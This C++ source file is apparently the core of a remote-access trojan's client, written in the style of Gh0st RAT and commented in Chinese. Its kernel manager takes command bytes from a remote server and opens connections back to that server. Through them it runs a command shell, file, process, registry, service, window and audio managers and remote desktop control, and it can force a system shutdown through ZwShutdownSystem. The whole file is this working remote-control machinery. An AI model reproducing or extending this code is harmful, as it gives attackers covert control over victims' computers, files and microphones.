#include "KernelManager.h"
#include"RemoteMessageManager.h"
#include"ProcessManager.h"
#include "CmdManager.h"
#include"WindowManager.h"
#include"RemoteControl.h"
#include"FileManager.h"
#include"ServiceManager.h"
#include"AudioManager.h"
#include"RegisterManager.h"
#include"Common.h"

extern  char    __ServerIPAddress[MAX_PATH];
extern  USHORT  __ServerConnectPort;
CKernelManager::CKernelManager(_CIOCPClient* IOCPClient):CManager(IOCPClient)
{
	m_ThreadHandleCount = 0;
}


CKernelManager::~CKernelManager()
{
	printf("~CKernelManager()\r\n");
}
void  CKernelManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_GET_OUT_REQUEST:
	{
		IsToken = CLIENT_GET_OUT_REPLY;
		m_IOCPClient->OnSending((char*)&IsToken, 1);
		break;
	}
	case  CLIENT_REMOTE_MESSAGE_REQUEST:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RemoteMessageProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_SHUT_DOWN_REQUEST:
	{
		IsToken = CLIENT_SHUT_DOWN_REPLY;
		m_IOCPClient->OnSending((char*)&IsToken, 1);
		Sleep(1);
		SetProcessPrivilege(GetCurrentProcess(), TRUE, SE_SHUTDOWN_NAME);
		ShutdownSystem();
		SetProcessPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);
		break;
	}
	case  CLIENT_CMD_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)CMDManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case  CLIENT_PROCESS_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case  CLIENT_WINDOW_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)WindowManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case  CLIENT_REMOTE_CONTROL_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)RemoteControlProcedure,
		NULL, 0, NULL);
		break;
	}
	case  CLIENT_FILE_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)FileManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case  CLIENT_AUDIO_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)AudioManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case  CLIENT_SERVICE_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ServiceManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case  CLIENT_REGISTER_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RegisterManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	}
}
void  CKernelManager::ShutdownSystem()
{
	//获得Ntdll的模块函数
	HMODULE  NtdllModuleBase = LoadLibraryA("Ntdll.DLL");
	if (NtdllModuleBase == NULL)
	{
		return;
	}
	typedef  int(_stdcall* PFNZWSHUTDOWNSYSTEM)(int);
	PFNZWSHUTDOWNSYSTEM  ZwShutdownSystem = NULL;
	ZwShutdownSystem = (PFNZWSHUTDOWNSYSTEM)GetProcAddress(NtdllModuleBase, "ZwShutdownSystem");
	if (ZwShutdownSystem == NULL)
	{
		goto  Exit;
	}
	ZwShutdownSystem(2);
Exit:
	if (NtdllModuleBase != NULL)
	{
		FreeLibrary(NtdllModuleBase);
		NtdllModuleBase = NULL;
	}

}
//远程消息
DWORD  WINAPI  RemoteMessageProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CRemoteMessageManager   RemoteMessageManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//进程管理
DWORD  WINAPI  ProcessManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CProcessManager   ProcessManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//CMD管理
DWORD  WINAPI  CMDManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CCmdManager   CmdManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//窗口管理
DWORD  WINAPI  WindowManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CWindowManager   WindowManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//远程控制
DWORD  WINAPI  RemoteControlProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CRemoteControl   RemoteControl(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//文件管理
DWORD  WINAPI  FileManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CFileManager   FileManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//语音管理
DWORD  WINAPI  AudioManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CAudioManager   AudioManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//服务管理
DWORD  WINAPI  ServiceManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CServiceManager   ServiceManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}
//注册表管理
DWORD  WINAPI  RegisterManagerProcedure(LPVOID  ParameterData)
{
	//建立一个新的连接
	_CIOCPClient  IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
	{
		return -1;
	}
	CRegisterManager   RegisterManager(&IOCPClient);

	IOCPClient.WaitForEvent();
}